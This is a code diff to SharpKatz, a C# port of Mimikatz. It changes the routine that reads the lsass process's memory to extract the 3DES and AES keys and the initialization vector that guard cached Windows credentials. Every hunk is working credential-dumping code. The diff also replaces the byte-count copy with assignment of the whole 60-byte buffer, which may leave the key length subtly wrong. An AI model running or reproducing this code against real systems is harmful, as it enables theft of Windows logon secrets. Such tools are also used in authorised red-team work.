@@ -16,10 +16,11 @@ namespace SharpKatz
         static long max_search_size = 580000;
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct KIWI_HARD_KEY
+        public struct KIWI_HARD_KEY
         {
             public int cbSecret;
-            public fixed byte data[60]; // etc...
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 60)]
+            public byte[] data; // etc...
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -74,7 +75,7 @@ namespace SharpKatz
             return aeskey;
         }
 
-        private unsafe int FindKeys(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper)
+        private int FindKeys(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper)
         {
 
             long keySigOffset = 0;
@@ -104,11 +105,6 @@ namespace SharpKatz
             // Read InitializationVector (16 bytes)
             this.iv = Utility.ReadFromLsass(ref hLsass, tmp_p, 16);
 
-            //Console.WriteLine("[*] InitializationVector recovered as:");
-            //Console.WriteLine("[*] ====[ Start ]====");
-            //Console.WriteLine("[*]  {0}", Utility.PrintHexBytes(this.iv));
-            //Console.WriteLine("[*] ====[ End ]===");
-
             tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.DES_OFFSET);
 
             // Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
@@ -123,15 +119,15 @@ namespace SharpKatz
             long keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);
 
             // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
-            byte[] h3DesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Convert.ToUInt64(sizeof(KIWI_BCRYPT_HANDLE_KEY)));
+            byte[] h3DesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY))));
             h3DesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(h3DesKeyBytes);
 
             // Read in the 3DES key
-            byte[] extracted3DesKeyByte = Utility.ReadFromLsass(ref hLsass, h3DesKey.key, Convert.ToUInt64(sizeof(KIWI_BCRYPT_KEY81)));
+            byte[] extracted3DesKeyByte = Utility.ReadFromLsass(ref hLsass, h3DesKey.key, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81))));
             extracted3DesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extracted3DesKeyByte);
 
-            this.deskey = new byte[Convert.ToInt32(extracted3DesKey.hardkey.cbSecret)];
-            Marshal.Copy((IntPtr)extracted3DesKey.hardkey.data, this.deskey, 0, (int)extracted3DesKey.hardkey.cbSecret);
+            this.deskey = extracted3DesKey.hardkey.data;
+            //Marshal.Copy((IntPtr)extracted3DesKey.hardkey.data, this.deskey, 0, (int)extracted3DesKey.hardkey.cbSecret);
 
             tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.AES_OFFSET);
 
@@ -146,16 +142,16 @@ namespace SharpKatz
             keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);
 
             // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
-            byte[] hAesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Convert.ToUInt64(sizeof(KIWI_BCRYPT_HANDLE_KEY)));
+            byte[] hAesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY))));
             hAesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(hAesKeyBytes);
 
             // Read in AES key
-            byte[] extractedAesKeyBytes = Utility.ReadFromLsass(ref hLsass, hAesKey.key, Convert.ToUInt64(sizeof(KIWI_BCRYPT_KEY81)));
+            byte[] extractedAesKeyBytes = Utility.ReadFromLsass(ref hLsass, hAesKey.key, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81))));
             extractedAesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extractedAesKeyBytes);
 
             
-            this.aeskey = new byte[extractedAesKey.hardkey.cbSecret];
-            Marshal.Copy((IntPtr)extractedAesKey.hardkey.data, this.aeskey, 0, (int)extractedAesKey.hardkey.cbSecret);
+            this.aeskey = extractedAesKey.hardkey.data;
+            //Marshal.Copy((IntPtr)extractedAesKey.hardkey.data, this.aeskey, 0, (int)extractedAesKey.hardkey.cbSecret);
             
             return 0;
         }
